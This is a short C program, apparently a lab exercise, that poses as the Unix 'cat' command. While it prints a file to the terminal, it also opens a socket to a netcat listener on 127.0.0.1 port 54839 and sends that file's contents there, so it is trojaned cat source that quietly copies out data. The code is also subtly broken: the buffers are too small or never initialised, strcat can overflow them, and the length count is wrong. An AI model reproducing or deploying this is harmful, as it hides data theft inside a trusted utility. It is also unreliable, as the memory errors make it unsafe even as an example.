#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

struct sockaddr_in ServAddr, ClientAddr;

int main(int argc, char** argv)
{
    ////////////// Set up
    int n, s, dataSocket;
    socklen_t ServAddrLen;
    socklen_t ClientAddrLen;
    //Configure struct for command port
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_port = htons(54839);
    ServAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    ServAddrLen = sizeof(ServAddr);

    //Create socket and connect to NetCat
    dataSocket = socket(AF_INET, SOCK_STREAM, 0);
    connect(dataSocket, (struct sockaddr*)&ServAddr, ServAddrLen);
    ///////////// Code we're replicating goes below
    //This code replicates cat
	FILE * fp = NULL;
	if(argc==0){
		printf("I don't really do that...");
	}
	char cwd[1024];
	getcwd(cwd, sizeof(cwd));
	char * file = malloc(strlen(cwd)+strlen(argv[1]));
	strcat(file,cwd);
	strcat(file, "/");
	strcat(file,argv[1]);
	fp = fopen(file, "r");
	char * curline = NULL;
	ssize_t read;
	size_t len;
	if(fp == NULL){
		printf("File '%s' does not exist", file);
		exit(EXIT_FAILURE);
	}
	char *buffer = malloc(sizeof(char)*2048);
	int totlen = 0;
	while((read=getline(&curline, &len, fp))!=-1){
		printf("%s", curline);
		strcat(buffer, curline);
		totlen+=len;
		curline=NULL;
	}
    //This redirects the data being cat'd to NetCat
	write(dataSocket, buffer, totlen);
	close(dataSocket);

	return 0;
}

